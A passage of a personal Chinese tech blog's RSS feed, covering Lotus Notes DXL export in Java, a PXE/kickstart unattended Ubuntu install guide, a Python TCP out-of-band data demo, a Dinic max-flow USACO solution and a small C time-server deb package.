Exception<BR>&nbsp; */<BR>&nbsp;public void view2Xml() throws Exception{<BR>&nbsp;&nbsp;if(getInbox()){<BR>&nbsp;&nbsp;&nbsp;dxl = s.createDxlExporter();<BR>&nbsp;&nbsp;&nbsp;dxl.setForceNoteFormat(false);<BR>&nbsp;&nbsp;&nbsp;dxl.setOutputDOCTYPE(false);<BR>&nbsp;&nbsp;&nbsp;dxl.setConvertNotesBitmapsToGIF(true);<BR>&nbsp;&nbsp;&nbsp;<BR>&nbsp;&nbsp;&nbsp;List&lt;Document&gt; docs = new Vector&lt;Document&gt;();<BR>&nbsp;&nbsp;&nbsp;Document doc = inbox.getFirstDocument();</P>
<P>&nbsp;&nbsp;&nbsp;int count = 0;<BR>&nbsp;&nbsp;&nbsp;do{<BR>&nbsp;&nbsp;&nbsp;&nbsp;docs.add(doc);<BR>&nbsp;&nbsp;&nbsp;}while((doc = inbox.getNextDocument(doc)) != null);<BR>&nbsp;&nbsp;&nbsp;for(Document xml : docs){<BR>&nbsp;&nbsp;&nbsp;&nbsp;if(doc2Xml(xml, ++count) == false){<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println("Failed:"+count);<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;}<BR>&nbsp;}<BR>&nbsp;/**<BR>&nbsp; * convert a document to xml<BR>&nbsp; * @param doc<BR>&nbsp; * @param index<BR>&nbsp; * @return<BR>&nbsp; */<BR>&nbsp;public boolean doc2Xml(Document doc, int index){<BR>&nbsp;&nbsp;try{<BR>&nbsp;&nbsp;&nbsp;String subject = doc.getItemValueString("Subject");<BR>&nbsp;&nbsp;&nbsp;subject = subject.replaceAll("[/|:|*|?|\"|&lt;|&gt;|.|\r|\n]", "_");<BR>&nbsp;&nbsp;&nbsp;if(subject.length() &gt; 200){<BR>&nbsp;&nbsp;&nbsp;&nbsp;subject = subject.substring(0, 200);<BR>&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;System.out.println(index + subject);<BR>&nbsp;&nbsp;&nbsp;<BR>&nbsp;&nbsp;&nbsp;Stream stream = s.createStream();<BR>&nbsp;&nbsp;&nbsp;if(stream.open(xmlPath + index + "_" + subject + ".xml")){<BR>&nbsp;&nbsp;&nbsp;&nbsp;stream.writeText(dxl.exportDxl(doc));<BR>&nbsp;&nbsp;&nbsp;&nbsp;stream.close();<BR>&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;return true;<BR>&nbsp;&nbsp;}<BR>&nbsp;&nbsp;catch(Exception ioe){<BR>&nbsp;&nbsp;&nbsp;ioe.printStackTrace();<BR>&nbsp;&nbsp;&nbsp;return false;<BR>&nbsp;&nbsp;}<BR>&nbsp;}<BR>&nbsp;/**<BR>&nbsp; * List all views in the database.<BR>&nbsp; */<BR>&nbsp;public void listView() throws Exception{<BR>&nbsp;&nbsp;System.out.println("==================Views==============");<BR>&nbsp;&nbsp;<BR>&nbsp;&nbsp;Vector&lt;View&gt; views = db.getViews();<BR>&nbsp;&nbsp;for(View view : views){<BR>&nbsp;&nbsp;&nbsp;System.out.println(view.getName());<BR>&nbsp;&nbsp;&nbsp;byte []tmp = view.getName().getBytes();<BR>&nbsp;&nbsp;&nbsp;for(int j = 0; j &lt; tmp.length; j ++){<BR>&nbsp;&nbsp;&nbsp;&nbsp;System.out.print(tmp[j]);<BR>&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;System.out.println();<BR>&nbsp;&nbsp;}<BR>&nbsp;&nbsp;System.out.println("=================End Views==============");<BR>&nbsp;}<BR>&nbsp;/**<BR>&nbsp; * list all columns of a document <BR>&nbsp; * @param doc<BR>&nbsp; * @throws Exception<BR>&nbsp; */<BR>&nbsp;public void listColumns(Document doc)throws Exception{<BR>&nbsp;&nbsp;//items: Form, SendTo,CopyTo,From,Subject,DeliveryPriority<BR>&nbsp;&nbsp;List&lt;Item&gt; items = doc.getItems();<BR>&nbsp;&nbsp;for(Item item : items ){<BR>&nbsp;&nbsp;&nbsp;System.out.print(item.getName());<BR>&nbsp;&nbsp;&nbsp;String temp = doc.getItemValue(item.getName()).toString();<BR>&nbsp;&nbsp;&nbsp;System.out.println(temp);<BR>&nbsp;&nbsp;}<BR>&nbsp;&nbsp;System.out.println(doc.getEmbeddedObjects());<BR>&nbsp;}<BR>&nbsp;private boolean getInbox(){<BR>&nbsp;&nbsp;System.out.println("INFO: begin get inbox");<BR>&nbsp;&nbsp;NotesThread.sinitThread(); // start thread<BR>&nbsp;&nbsp;try{<BR>&nbsp;&nbsp;&nbsp;s = NotesFactory.createSession();<BR>&nbsp;&nbsp;&nbsp;System.out.println("INFO:&nbsp; session got");<BR>&nbsp;&nbsp;&nbsp;db = s.getDatabase(s.getServerName(),dbName);<BR>&nbsp;&nbsp;&nbsp;System.out.println("INFO:&nbsp; db got");<BR>&nbsp;&nbsp;&nbsp;if(viewType == TYPE_VIEWNAME)<BR>&nbsp;&nbsp;&nbsp;&nbsp;inbox = db.getView(viewName);<BR>&nbsp;&nbsp;&nbsp;else if(viewType == TYPE_VIEWINDEX)<BR>&nbsp;&nbsp;&nbsp;&nbsp;inbox = (View)db.getViews().get(viewIndex);<BR>&nbsp;&nbsp;&nbsp;else<BR>&nbsp;&nbsp;&nbsp;&nbsp;return false;<BR>&nbsp;&nbsp;&nbsp;System.out.println("INFO:&nbsp; view got");<BR>&nbsp;&nbsp;}<BR>&nbsp;&nbsp;catch(Exception e){<BR>&nbsp;&nbsp;&nbsp;e.printStackTrace();<BR>&nbsp;&nbsp;&nbsp;return false;<BR>&nbsp;&nbsp;}<BR>&nbsp;&nbsp;return true;<BR>&nbsp;}<BR>&nbsp;/**<BR>&nbsp; * Setter and getter<BR>&nbsp; * @return<BR>&nbsp; */<BR>&nbsp;public String getViewName() {<BR>&nbsp;&nbsp;return viewName;<BR>&nbsp;}<BR>&nbsp;public void setViewName(String viewName) {<BR>&nbsp;&nbsp;this.viewName = viewName;<BR>&nbsp;}<BR>&nbsp;public int getViewIndex() {<BR>&nbsp;&nbsp;return viewIndex;<BR>&nbsp;}<BR>&nbsp;public void setViewIndex(int viewIndex) {<BR>&nbsp;&nbsp;this.viewIndex = viewIndex;<BR>&nbsp;}<BR>&nbsp;public int getViewType() {<BR>&nbsp;&nbsp;return viewType;<BR>&nbsp;}<BR>&nbsp;public void setViewType(int viewType) {<BR>&nbsp;&nbsp;this.viewType = viewType;<BR>&nbsp;}<BR>&nbsp;public String getDbName() {<BR>&nbsp;&nbsp;return dbName;<BR>&nbsp;}<BR>&nbsp;public void setDbName(String dbName) {<BR>&nbsp;&nbsp;this.dbName = dbName;<BR>&nbsp;}<BR>&nbsp;public String getXmlPath() {<BR>&nbsp;&nbsp;return xmlPath;<BR>&nbsp;}<BR>&nbsp;public void setXmlPath(String xmlPath) {<BR>&nbsp;&nbsp;this.xmlPath = xmlPath;<BR>&nbsp;&nbsp;File path = new File(xmlPath);<BR>&nbsp;&nbsp;if(!path.exists())<BR>&nbsp;&nbsp;&nbsp;path.mkdir();<BR>&nbsp;}<BR>}<BR></P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>other</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720085321439261/</guid>
    </item>
    <item>
      <title>
<![CDATA[PXE无人值守Ubuntu全自动网络安装]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720094214277715/</link>
      <description>
<![CDATA[1. 搭建mirror<br>1.1 首先安装启动apache服务器 <br>sudo apt-get install apache2<br>1.2 挂载安装文件镜像<br>sudo mkdir /var/www/ubuntu<br>sudo mount -o loop ubuntu-server-8.04.2-i386.iso /var/www/ubuntu<br><br>2. 搭建PXE服务器<br>2.1 搭建dhcp服务器<br>sudo apt-get install dhcp3-server<br>sudo vi /etc/default/dhcp3-server<br>INTERFACES="<span style="color: rgb(255, 0, 0);">eth0</span>"<br>sudo vi /etc/dhcp3/dhcpd.conf<br><style>BODY { FONT-FAMILY:Tahoma; FONT-SIZE:10pt }
P { FONT-FAMILY:Tahoma; FONT-SIZE:10pt }
DIV { FONT-FAMILY:Tahoma; FONT-SIZE:10pt }
TD { FONT-FAMILY:Tahoma; FONT-SIZE:10pt }
</style>option routers 192.168.1.111;
<div>option domain-name-servers 202.114.0.242;</div>
<div>&nbsp;</div>
<div>subnet 192.168.1.0 netmask 255.255.255.0 {</div>
<div>&nbsp;&nbsp;range dynamic-bootp 192.168.1.2 192.168.1.29;</div>
<div>&nbsp;&nbsp;filename "pxelinux.0";</div>
<div>}</div>
<div>&nbsp;</div>
<div>host pxeinstall {</div>
<div>&nbsp;&nbsp;hardware ethernet [MAC 00:0A:E4:2E:A6:42;</div>
<div>&nbsp;&nbsp;fixed-address 192.168.1.8;</div>
<div>&nbsp;&nbsp;filename "pxelinux.0";</div>
<div>}</div>sudo /etc/init.d/dhcp3-server start<br>2.2 搭建tftp服务器<br>sudo apt-get install tftpd-hpa<br>sudo update-inetd --enable BOOT<br>sudo vi /etc/default/tftpd-hpa<br>RUN_DAEMON="<span style="color: rgb(255, 0, 0);">yes</span>"<br>sudo /etc/init.d/tftpd-hpa start<br>2.3 配置PXE<br>cp -a /var/www/ubuntu/install/netboot/* /var/lib/tftpboot/<br>#创建链接<br>ifconfig #例如查到的mac地址是00:0A:E4:2E:A6:42<br>lns -s /var/lib/tftpboot/pxelinux.cfg/default /var/lib/tftpboot/pxelinux.cfg/000AE42EA642<br><br>3. 创建kickstart脚本<br>3.1 创建ks.cfg <br>sudo apt-get install system-config-kickstart<br>system-config-kickstart<br>保存为/var/www/ks.cfg<br>3.2 在PXE启动菜单中指定kickstart文件<br>修改/var/lib/tftpboot/pxelinux.cfg/default<br>增加一个启动项<br>LABEL auto<br>&nbsp;&nbsp;&nbsp; kernel ubuntu-installer/i386/linux<br>&nbsp;&nbsp;&nbsp; append ks=http://192.201.0.111/ks.cfg vga=normal initrd=ubuntu-installer/i386/initrd.gz --<br><br>4. 客户端BIOS启动时选择PXE网络启动，然后在启动界面输入auto，然后按回车，系统会根据ks.cfg的配置自动分区，自动配置网络，自动设置用户，若干分钟后，显示登录提示符，用户名cbib 密码cbib<br><br>一个示例kickstart配置文件:<br><style>BODY { FONT-FAMILY:Tahoma; FONT-SIZE:10pt }
P { FONT-FAMILY:Tahoma; FONT-SIZE:10pt }
DIV { FONT-FAMILY:Tahoma; FONT-SIZE:10pt }
TD { FONT-FAMILY:Tahoma; FONT-SIZE:10pt }
</style><font face="monospace">#example: ks.cfg</font>
<div><font face="monospace">#Generated by Kickstart Configurator<br>#platform=x86<br><br>#System language<br>lang en_US<br>#Language modules to install<br>langsupport en_US<br>#System keyboard<br>keyboard us<br>#System mouse<br>mouse<br>#System timezone<br>timezone --utc America/New_York<br>#Root password<br>rootpw --disabled<br>#Initial user, username: cbib password: cbib<br>user cbib --fullname "cbib" --iscrypted --password $1$Fcf/xwwE$aHXt6SEkPGVuxPT7cwKNa.<br>#Reboot after installation<br>reboot<br>#Use text mode install<br>text<br>#Install OS instead of upgrade<br>install<br>#Use Web installation<br>url --url <span style="color: rgb(255, 0, 0);">http://192.201.0.111/ubuntu</span><br>#System bootloader configuration<br>bootloader --location=mbr<br>#Clear the Master Boot Record<br>zerombr yes<br>#Partition clearing information<br><span style="color: rgb(255, 0, 0);">clearpart --all --initlabel</span><br>#Disk partitioning information<br>part /boot --fstype ext2 --size 150<br>part swap --recommended<br>part / --fstype ext3 --size 1 --grow<br>#System authorization infomation<br>auth &nbsp;--useshadow &nbsp;--enablemd5<br>#Network information<br>network --bootproto=static --ip=<span style="color: rgb(255, 0, 0);">192.201.0.7 --netmask=255.255.255.0 --gateway=192.201.0.253 --nameserver=202.114.215.73</span> --device=eth0<br>#Firewall configuration<br>firewall --disabled<br>#Do not configure the X Window System<br>skipx</font></div><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720094214277715/</guid>
    </item>
    <item>
      <title>
<![CDATA[TCP发送带外数据MSG_OOB SIGURG]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720109204212231/</link>
      <description>
<![CDATA[TCP是可靠连接，所以要发送数据的要依序发送，连接出问题后也要一定的时间才能检测出来。<br>好比三国杀，断线后一会儿才能发现，还要手工重新连接。<br>如果使用带外数据，就可以定时检测数据连接，发现断开后自动重新连接<br><br>带外数据以signal的方式进行处理，不影响正常TCP通信。<br><br>服务端：<br>from socket import *<br>import os,signal,fcntl<br>s=socket(AF_INET,SOCK_STREAM)<br>s.bind(('0.0.0.0',5555))<br>s.listen(20)<br>c,a=s.accept()<br>def sig_urg(fr,signo):<br>&nbsp; x=c.recv(20,MSG_OOB)<br>&nbsp; print x<br><br>signal.signal(signal.SIGURG, sig_urg)<br>fcntl.fcntl(c.fileno(), fcntl.F_SETOWN, os.getpid())<br><br><br>
客户端：<br>from socket import *<br>s=socket(AF_INET,SOCK_STREAM)<br>s.connect(('127.0.0.1',5555))<br>s.send('hello', MSG_OOB)]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720109204212231/</guid>
    </item>
    <item>
      <title>
<![CDATA[解决网络最大流问题USACO4.2.1的Dinic算法]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201062103115412/</link>
      <description>
<![CDATA[解决网络最大流问题的算法很多，Dinic 是其中比较快的算法之一，虽然传说中ISAP是最快的，但是用Dinic求解USACO的4.2.1已经足够了<br>USACO 上提供的网编流算法思想是，找一个增广路径，然后增广流量，直到没有增广路径为止。<br>这是有两个问题：什么是增广路径？什么叫增广流量？<br>增广路径：就是从源点到终点的一条路径<br>增广流量：首先找到增广路径上的最小流x，然后对增广路径上的每条边，减去x，并反向增加x<br>如: 源点1，终点8。1-&gt;3流为20, 3-&gt;5流为10, 5-&gt;8流为30，则最小流为10，1-&gt;3变为20-10，3-&gt;5变为10-10，5-&gt;8变为30-10，3-&gt;1的流量增加10，5-&gt;3的流量增加10，8-&gt;5的流量增加10<br>算法流程为<br>maxflow = 0<br>while 有增广路径<br>&nbsp; maxflow += 最小流<br>&nbsp; 沿增广路径 增广流量<br>增广流量很简单，就是简单地修改图的边的，因此，主要的问题就是如何找增广路径。<br>最简单的办法是直接DFS，在USACO上可以过6个测试点，如果改用邻接表存储图的边，则可以过7个测试点，如果在增广流量的时候把流量为0的路径从邻接表中去除，就可以过8个测试点。要想过下面的4个测试点，就要优化了。<br>瓶颈在DFS上，当然就要用BFS优化，但是BFS的空间复杂度太高，因此采用BFS和DFS结合的方法，先用BFS对每个点标号，然后根据标号进行DFS。<br>如何标号：将源点S标为0，S的邻接点标为1，S的邻接点的未标号的邻接点标为2，...用BFS实现这个很简单<br>如何根据标号进行DFS：只有比该接点的标号多1的邻接点，才递归DFS，否则跳过。<br>附上程序：<br>/*<br>ID: hankjin1<br>LANG: C++<br>TASK: ditch<br>*/<br>#include &lt;iostream&gt;<br>#include &lt;fstream&gt;<br>#include &lt;algorithm&gt;<br>using namespace std;<br><br>//note: TLE of test 8 if no 0 dist path removed<br>//note: TLE of test 9<br>int N,M;<br>int ditch[201][201];<br>int path[201][201];<br><br>bool used[201];<br>int seq[201];<br>int bestseq[201];<br>int minV;<br>inline void add(int from, int to, int v){<br>&nbsp;&nbsp;&nbsp; if(ditch[from][to]==0){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; path[from][ ++path[from][0] ] = to;<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; ditch[from][to]+=v;<br>}<br>inline void rm(int from, int to, int v){<br>&nbsp;&nbsp;&nbsp; ditch[from][to]-=v;<br>&nbsp;&nbsp;&nbsp; if(ditch[from][to]==0){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(int i=1;i&lt;=path[from][0];i++){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(path[from][i]==to){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; path[from][i]=path[from][ path[from][0] ];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; path[from][0]--;<br>&nbsp;&nbsp;&nbsp; }<br>}<br>int dfs(int point, int x){<br>&nbsp;&nbsp;&nbsp; seq[x]=point;<br>&nbsp;&nbsp;&nbsp; used[point]=true;<br>&nbsp;&nbsp;&nbsp; for(int i=1; i&lt;=path[point][0];i++){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int j = path[point][i];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(!used[j]){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(j == M){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; seq[x+1]=M;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return ditch[point][j];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int res = dfs(j, x+1);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(res &gt; 0)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return min(ditch[point][j], res);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; used[point]=false;<br>&nbsp;&nbsp;&nbsp; return 0;<br>}<br>int solve(){<br>&nbsp;&nbsp;&nbsp; int total = 0;<br>&nbsp;&nbsp;&nbsp; while(true){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fill_n(seq, M+1, 0);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fill_n(used, M+1, false);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int v = dfs(1, 1);//find max path<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(v == 0)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; total += v;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(int i=1; seq[i]!=M;i++){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rm(seq[i], seq[i+1], v);<br>//&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ditch[seq[i]][seq[i+1]] -= v;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; add(seq[i+1], seq[i], v);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; return total;<br>}<br>int main(){<br>&nbsp;&nbsp;&nbsp; ifstream fin("ditch.in");<br>&nbsp;&nbsp;&nbsp; ofstream fout("ditch.out");<br>&nbsp;&nbsp;&nbsp; fin&gt;&gt;N&gt;&gt;M;<br>&nbsp;&nbsp;&nbsp; int a,b,c;<br>&nbsp;&nbsp;&nbsp; for(int i=0;i&lt;N;i++){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fin&gt;&gt;a&gt;&gt;b&gt;&gt;c;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; add(a,b,c);<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; fout&lt;&lt;solve()&lt;&lt;endl;<br>&nbsp;&nbsp;&nbsp; return 0;<br>}]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>other</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201062103115412/</guid>
    </item>
    <item>
      <title>
<![CDATA[为MiniLinux编写时间服务器软件包]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200932712948904/</link>
      <description>
<![CDATA[编写一个时间服务器程序的deb包<br>编写两个文件Makefile和timed.c<br>$ make static<br>$ sudo make publish<br>注意:在printf后面加上fflush(NULL), 否则在log文件中看不到回应.<br><br><br>附Makefile和timed.c<br>#Makefile:<br>all: timed<br>timed: timed.c<br>&nbsp; cc -static timed.c -o timed<br>publish: timed<br>&nbsp; checkinstall --install=no<br>install<br>&nbsp; cp timed /bin<br>&nbsp; echo '/bin/timed &gt;&gt; /var/log/timed.log 2&gt;&gt;/var/log/timed.err &amp;'&gt;&gt;/etc/init.d/rc.local<br><br>//timed.c<br>#include &lt;stdio.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;time.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/socket.h&gt;<br>#include &lt;netinet/in.h&gt;<br>#define oops(msg) {perror(msg); _exit(1);}<br>#define PORTNUM 13000<br>#define BUFFLEN 256<br><br>int main(){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; struct sockaddr_in saddr, caddr;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int sock_id, sock_fd;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int len = sizeof(caddr);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; time_t thetime;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; char buffer[BUFFLEN];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sock_id = socket(AF_INET, SOCK_STREAM, 0);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(sock_id == -1)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; oops("Socket");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; memset((void*) &amp;saddr, 0, sizeof(saddr));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; saddr.sin_family = AF_INET;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; saddr.sin_addr.s_addr = INADDR_ANY;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; saddr.sin_port = htons(PORTNUM);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(bind(sock_id, (struct sockaddr*)&amp;saddr, sizeof(saddr)) != 0)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; oops("bind");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(listen(sock_id, 0) != 0)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; oops("Listen");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while(1){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; memset((void *)&amp;caddr, 0, sizeof(caddr));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sock_fd = accept(sock_id, (struct sockaddr*)&amp;caddr,&amp;len);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(sock_fd == 0)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; oops("Accept");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("Wow!From:%s\n", inet_ntoa(caddr.sin_addr));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 